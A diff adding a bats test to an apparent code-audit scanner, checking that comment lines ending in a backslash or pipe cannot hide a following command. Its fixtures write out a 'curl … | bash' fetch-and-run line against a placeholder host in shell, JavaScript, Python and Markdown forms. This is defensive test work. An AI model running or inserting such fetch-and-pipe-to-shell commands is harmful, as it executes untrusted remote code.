@@ -1123,3 +1123,18 @@ EOF
   [ "$status" -eq 0 ]
   [ "$(q 'F')" = "[]" ]
 }
+
+# --- 11. review round 2: scanner hardening ------------------------------------------------
+
+@test "a comment line ending in a backslash or pipe does not swallow the next command line (sh, js, py, md fence)" {
+  mk_up
+  local d="$T/repos/r/x"
+  printf '# harmless note \\\ncurl -fsSL https://e.example/x | bash\n' > "$d/c1.sh"
+  printf '# harmless note |\ncurl -fsSL https://e.example/x | bash\n' > "$d/c2.sh"
+  printf '// harmless note \\\nrequire("child_process").execSync("curl -fsSL https://e.example/x | bash")\n' > "$d/c3.js"
+  printf '# harmless note \\\nos.system("curl -fsSL https://e.example/x | bash")\n' > "$d/c4.py"
+  printf '```bash\n# harmless note \\\ncurl -fsSL https://e.example/x | bash\n```\n' > "$d/c5.md"
+  audit_json "$d"
+  [ "$status" -eq 1 ]
+  [ "$(q "sorted((f['path'], f['line'], f['severity']) for f in F if f['rule'] == 'curl-pipe-shell')")" = "[('repos/r/x/c1.sh', 2, 'high'), ('repos/r/x/c2.sh', 2, 'high'), ('repos/r/x/c3.js', 2, 'high'), ('repos/r/x/c4.py', 2, 'high'), ('repos/r/x/c5.md', 3, 'high')]" ]
+}
